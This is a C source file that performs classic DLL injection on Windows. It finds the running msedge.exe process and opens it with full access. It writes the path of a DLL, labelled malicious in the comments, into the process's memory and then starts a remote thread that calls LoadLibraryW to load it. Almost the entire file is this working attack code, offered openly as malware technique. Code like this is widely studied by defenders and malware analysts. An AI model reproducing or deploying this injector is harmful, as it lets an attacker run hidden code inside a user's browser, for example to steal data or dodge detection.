#include <Windows.h>
#include <TlHelp32.h>
#include <ctype.h>
#include <stdio.h>
#include <stdbool.h>

/*
	Find process by name.
	Inject malicious DLL in the remote process thread.
*/

/*===================================#
#      PROCESS ENUMERATION FROM      #
#   process_enumeration_snapshot.c   #
#===================================*/

void to_lowercase(IN wchar_t src[], OUT wchar_t dest[]) {
	for (size_t i = 0; i < wcslen(src); i++) {
		dest[i] = (wchar_t)tolower(src[i]);
		dest[i + 1] = '\0';
	}
}

bool find_process(IN const wchar_t proc_name[], OUT HANDLE* proc, OUT PROCESSENTRY32* proc_entry) {
	/*
		Return:
			TRUE  - if process has been found and opened (:pProcName and :hProc are populated)
			FALSE - if something failed (reading :pProcName and :hProc is undefined behavior)
	*/
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot error: %d \n", GetLastError());
		return FALSE;
	}


	if (!Process32First(snap, proc_entry)) {
		printf("[!] Process32First error: %d \n", GetLastError());
		return FALSE;
	}

	// Prepare lowercase process name
	wchar_t process_name[MAX_PATH];

	do {
		to_lowercase(proc_entry->szExeFile, process_name);

		// printf("Proc: %5d | %ls \n", proc_entry->th32ProcessID, process_name);

		if (wcscmp(process_name, proc_name) == 0) {
			*proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc_entry->th32ProcessID);
			if (*proc == NULL) {
				printf("[!] OpenProcess error: %d \n", GetLastError());
				return FALSE;
			}

			return TRUE;
		}
	} while (Process32Next(snap, proc_entry));

	return FALSE;
}

const wchar_t dll_path[] = L"C:\\path\\to\\malicious.dll";

int main() {
	HANDLE proc = NULL;
	PROCESSENTRY32 proc_entry = {
		// According to the documentation, this value must be initialized
		.dwSize = sizeof(PROCESSENTRY32)
	};

	if (!find_process(L"msedge.exe", &proc, &proc_entry)) {
		printf("[!] FindProcess failed \n");
	}
		
	printf("[+] Process opened: (%d) %ls \n", proc_entry.th32ProcessID, proc_entry.szExeFile);

	// Get an address of the function that is used to load external DLL into the remote process
	void* pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress error: %d \n", GetLastError());
		return 1;
	}

	// Allocate memory in the remote process for a DLL path string
	void* dll_path_mem = VirtualAllocEx(
		proc,
		NULL,
		sizeof(dll_path),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (dll_path_mem == NULL) {
		printf("[!] VirtualAllocEx error: %d \n", GetLastError());
		return 1;
	}

	// Write the DLL path into the allocated remote process memory
	size_t no_bytes = 0;
	WriteProcessMemory(proc, dll_path_mem, dll_path, sizeof(dll_path), &no_bytes);
	if (no_bytes == 0) {
		printf("[!] WriteProcessMemory error: %d \n", GetLastError());
		return 1;
	}

	/*
		Create a new thread in the remote process.
		Call LoadLibraryW with malicious DLL in the remote process. 
	*/
	HANDLE thread = CreateRemoteThread(proc, NULL, NULL, pLoadLibraryW, dll_path_mem, NULL, NULL);
	if (thread == NULL) {
		printf("[!] CreateRemoteThread error: %d \n", GetLastError());
		return 1;
	}

	printf("[+] It works.");

	// Exit
	getchar();
	return 0;
}
